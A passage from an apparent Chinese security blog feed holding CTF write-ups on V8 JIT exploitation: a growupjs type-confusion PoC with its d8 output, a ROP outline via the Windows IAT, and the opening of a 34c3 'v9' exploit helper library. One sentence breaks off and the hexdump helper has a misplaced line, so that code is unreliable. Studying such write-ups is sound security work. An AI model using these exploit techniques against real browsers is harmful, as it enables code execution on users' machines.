InitializeModuleEmbedderData(context);</span></span></span><br></pre></td></tr></table></figure><p>题目给了两个patch，第一个patch是禁用了code dependencies，第二个patch应该是禁用了wasm这种利用方法。<br>要理解这个patch，就要知道v8中不止有<br>实际上注册对arr的type的dependencies的地方在ReduceElementAccess的BuildCheckMaps中，换句话说，如果我们要check的map是stableMap，就直接注册一个 compilation dependencies的回调到map中。<br>如果不是，就插入一个checkMap节点到effect chain中。<br>可以学习一下<a href="https://ssd-disclosure.com/archives/3379" target="_blank" rel="noopener">这个漏洞</a>，很有趣。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">JSNativeContextSpecialization::ReduceElementAccess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  ...</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">// Perform map check on the &#123;receiver&#125;.</span></span></span></span><br><span class="line"><span class="function"><span class="params">    access_builder.BuildCheckMaps(receiver, &amp;effect, control,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  access_info.receiver_maps());</span></span></span><br><span class="line"><span class="function"><span class="params">...</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">void</span> PropertyAccessBuilder::BuildCheckMaps(</span></span></span><br><span class="line"><span class="function"><span class="params">    Node* receiver, Node** effect, Node* control,</span></span></span><br><span class="line"><span class="function"><span class="params">    ZoneVector&lt;Handle&lt;Map&gt;&gt; <span class="keyword">const</span>&amp; receiver_maps) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">  HeapObjectMatcher m(receiver);</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">if</span> (m.HasValue()) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">    MapRef receiver_map = m.Ref(broker()).<span class="built_in">map</span>();</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">if</span> (receiver_map.is_stable()) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">for</span> (Handle&lt;Map&gt; <span class="built_in">map</span> : receiver_maps) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">if</span> (MapRef(broker(), <span class="built_in">map</span>).equals(receiver_map)) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">          dependencies()-&gt;DependOnStableMap(receiver_map);</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">return</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">        &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">      &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">    &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">  &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">  ZoneHandleSet&lt;Map&gt; maps;</span></span></span><br><span class="line"><span class="function"><span class="params">  CheckMapsFlags flags = CheckMapsFlag::kNone;</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">for</span> (Handle&lt;Map&gt; <span class="built_in">map</span> : receiver_maps) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">    MapRef receiver_map(broker(), <span class="built_in">map</span>);</span></span></span><br><span class="line"><span class="function"><span class="params">    maps.insert(receiver_map.object(), graph()-&gt;zone());</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">if</span> (receiver_map.is_migration_target()) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">      flags |= CheckMapsFlag::kTryMigrateInstance;</span></span></span><br><span class="line"><span class="function"><span class="params">    &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">  &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">  *effect = graph()-&gt;NewNode(simplified()-&gt;CheckMaps(flags, maps), receiver,</span></span></span><br><span class="line"><span class="function"><span class="params">                             *effect, control);</span></span></span><br><span class="line"><span class="function"><span class="params">&#125;</span></span></span><br></pre></td></tr></table></figure><p>而这个patch就是把install compile dependency的代码给禁用了，所以如果我们使用一个stable map的arr，将不会有任何的类型检查，于是就有了一个type confusion。</p><h3 id="IR分析-1"><a href="#IR分析-1" class="headerlink" title="IR分析"></a>IR分析</h3><h4 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h4><p>非stable map<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-17-072849.jpg" alt=""></p><h4 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h4><p>stable map<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-17-072916.jpg" alt=""></p><p>所以给出poc如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// make the map stable</span></span><br><span class="line">arr.x = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">idx</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// optimize foo</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)&#123;</span><br><span class="line">    foo(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// change arr to dictionary map</span></span><br><span class="line">arr[<span class="number">0x100000</span>] = <span class="number">5.5</span>;</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="number">1000</span>));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">sakura@sakuradeMacBook-Pro:~<span class="regexp">/Desktop/</span>v8/v8/out/gn$ ./d8 poc.js</span><br><span class="line"><span class="number">-1.1885946300594787e+148</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>stephen给出了一种非常精巧的漏洞利用方法，而不是使用wasm rwx内存，实际上这个迟早要被禁用。<br>通过poc我们很容易就可以得到任意地址读写的原语。<br>为了构建rop链，我们可以使用如下的方法，来自stephen，非常感谢。</p><ol><li>leak a binary pointer from the heap</li><li>read pointer to kernel32 from IAT</li><li>read kernelbase pointer from IAT of kernel32</li><li>There’s a stack pointer stored in a struct at KERNELBASE!BasepCurrentTopLevelFilter+8</li><li>ROP</li></ol><p>另外如果challenge只给了v8 binary，而是给了一个chromium的话，也可以参考我博客上关于bug-906043的漏洞利用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;qwb-growupjs-amp-wctf-independence-day-writeup&quot;&gt;&lt;a href=&quot;#qwb-growupjs-amp-wctf-independence-day-writeup&quot; class=&quot;headerlink&quot; title=&quot;
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>34c3 v9 writeup</title>
    <link href="http://eternalsakura13.com/2019/04/29/v9/"/>
    <id>http://eternalsakura13.com/2019/04/29/v9/</id>
    <published>2019-04-29T05:40:51.569Z</published>
    <updated>2019-04-29T05:50:30.926Z</updated>
    
    <content type="html"><![CDATA[<h1 id="34c3-v9-writeup"><a href="#34c3-v9-writeup" class="headerlink" title="34c3 v9 writeup"></a>34c3 v9 writeup</h1><p>很久之前做的了，和*CTF那题差不多，顺便就发出来。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/saelo/v9" target="_blank" rel="noopener">https://github.com/saelo/v9</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir v9 &amp;&amp; cd v9</span><br><span class="line">fetch v8 &amp;&amp; cd v8           # see https:&#x2F;&#x2F;github.com&#x2F;v8&#x2F;v8&#x2F;wiki&#x2F;Building-from-Source</span><br><span class="line">git checkout 6.3.292.48</span><br><span class="line">gclient sync</span><br><span class="line">patch -p1 &lt; &#x2F;path&#x2F;to&#x2F;v9.patch</span><br><span class="line">.&#x2F;tools&#x2F;dev&#x2F;v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn&#x2F;x64.debug</span><br></pre></td></tr></table></figure><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="工具类准备"><a href="#工具类准备" class="headerlink" title="工具类准备"></a>工具类准备</h3><p>这部分就是一些可复用的代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.padLeft =</span><br><span class="line"><span class="built_in">Number</span>.prototype.padLeft = <span class="function"><span class="keyword">function</span>(<span class="params">total, pad</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="built_in">Array</span>(total).join(pad || <span class="number">0</span>) + <span class="keyword">this</span>).slice(-total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the hexadecimal representation of the given byte array.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexlify</span>(<span class="params">bytes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> res = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">        <span class="comment">//print(bytes[i].toString(16));</span></span><br><span class="line">        res.push((<span class="string">'0'</span> + bytes[i].toString(<span class="number">16</span>)).substr(<span class="number">-2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.join(<span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the binary data represented by the given hexdecimal string.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unhexlify</span>(<span class="params">hexstr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hexstr.length % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Invalid hex string"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(hexstr.length / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; hexstr.length; i += <span class="number">2</span>)</span><br><span class="line">        bytes[i/<span class="number">2</span>] = <span class="built_in">parseInt</span>(hexstr.substr(i, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexdump</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> data.BYTES_PER_ELEMENT !== <span class="string">'undefined'</span>)</span><br><span class="line">        data = <span class="built_in">Array</span>.from(data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> lines = [];</span><br><span class="line">        <span class="keyword">var</span> chunk = data.slice(i, i+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> parts = chunk.map(hex);</span><br><span class="line">        <span class="keyword">if</span> (parts.length &gt; <span class="number">8</span>)</span><br><span class="line">            parts.splice(<span class="number">8</span>, <span class="number">0</span>, <span class="string">' '</span>);</span><br><span class="line">        lines.push(parts.join(<span class="string">' '</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lines.join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simplified version of the similarly named python module.</span></span><br><span class="line"><span class="keyword">var</span> Struct = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.</span></span><br><span class="line">    <span class="keyword">var</span> buffer      = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">var</span> byteView    = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer);</span><br><span class="line">    <span class="keyword">var</span> uint32View  = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span><br><span class="line">    <span class="keyword">var</span> float64View = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        pack: <span class="function"><span class="keyword">function</span>(<span class="params">type, value</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span><br><span class="line">            view[<span class="number">0</span>] = value;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer, <span class="number">0</span>, type.BYTES_PER_ELEMENT);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        unpack: <span class="function"><span class="keyword">function</span>(<span class="params">type, bytes</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (bytes.length !== type.BYTES_PER_ELEMENT)</span><br><span class="line">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Invalid bytearray"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span><br><span class="line">            byteView.set(bytes);</span><br><span class="line">            <span class="keyword">return</span> view[<span class="number">0</span>];</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Available types.</span></span><br><span class="line">        int8:    byteView,</span><br><span class="line">        int32:   uint32View,</span><br><span class="line">        float64: float64View</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Int64</span>(<span class="params">v</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// The underlying byte array.</span></span><br><span class="line">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">typeof</span> v) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'number'</span>:</span><br><span class="line">            v = <span class="string">'0x'</span> + <span class="built_in">Math</span>.floor(v).toString(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'string'</span>:</span><br><span class="line">            <span class="keyword">if</span> (v.startsWith(<span class="string">'0x'</span>))</span><br><span class="line">                v = v.substr(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> (v.length % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">                v = <span class="string">'0'</span> + v;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> bigEndian = unhexlify(v, <span class="number">8</span>);</span><br><span class="line">            <span class="comment">//print(bigEndian.toString());</span></span><br><span class="line">            bytes.set(<span class="built_in">Array</span>.from(bigEndian).reverse());</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'object'</span>:</span><br><span class="line">            <span class="keyword">if</span> (v <span class="keyword">instanceof</span> Int64) &#123;</span><br><span class="line">                bytes.set(v.bytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (v.length != <span class="number">8</span>)</span><br><span class="line">                    <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Array must have excactly 8 elements."</span>);</span><br><span class="line">                bytes.set(v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'undefined'</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Int64 constructor requires an argument."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a double whith the same underlying bit representation.</span></span><br><span class="line">    <span class="keyword">this</span>.asDouble = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Check for NaN</span></span><br><span class="line">        <span class="keyword">if</span> (bytes[<span class="number">7</span>] == <span class="number">0xff</span> &amp;&amp; (bytes[<span class="number">6</span>] == <span class="number">0xff</span> || bytes[<span class="number">6</span>] == <span class="number">0xfe</span>))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a double"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Struct.unpack(Struct.float64, bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a javascript value with the same underlying bit representation.</span></span><br><span class="line">    <span class="comment">// This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span></span><br><span class="line">    <span class="comment">// due to double conversion constraints.</span></span><br><span class="line">    <span class="keyword">this</span>.asJSValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((bytes[<span class="number">7</span>] == <span class="number">0</span> &amp;&amp; bytes[<span class="number">6</span>] == <span class="number">0</span>) || (bytes[<span class="number">7</span>] == <span class="number">0xff</span> &amp;&amp; bytes[<span class="number">6</span>] == <span class="number">0xff</span>))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a JSValue"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.</span></span><br><span class="line">        <span class="keyword">this</span>.assignSub(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span><br><span class="line">        <span class="keyword">var</span> res = Struct.unpack(Struct.float64, bytes);</span><br><span class="line">        <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the underlying bytes of this number as array.</span></span><br><span class="line">    <span class="keyword">this</span>.bytes = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Array</span>.from(bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the byte at the given index.</span></span><br><span class="line">    <span class="keyword">this</span>.byteAt = <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bytes[i];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the value of this number as unsigned hex string.</span></span><br><span class="line">    <span class="keyword">this</span>.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//print("toString");</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'0x'</span> + hexlify(<span class="built_in">Array</span>.from(bytes).reverse());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Basic arithmetic.</span></span><br><span class="line">    <span class="comment">// These functions assign the result of the computation to their 'this' object.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decorator for Int64 instance operations. Takes care</span></span><br><span class="line">    <span class="comment">// of converting arguments to Int64 instances if required.</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">operation</span>(<span class="params">f, nargs</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">arguments</span>.length != nargs)</span><br><span class="line">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Not enough arguments for function "</span> + f.name);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span 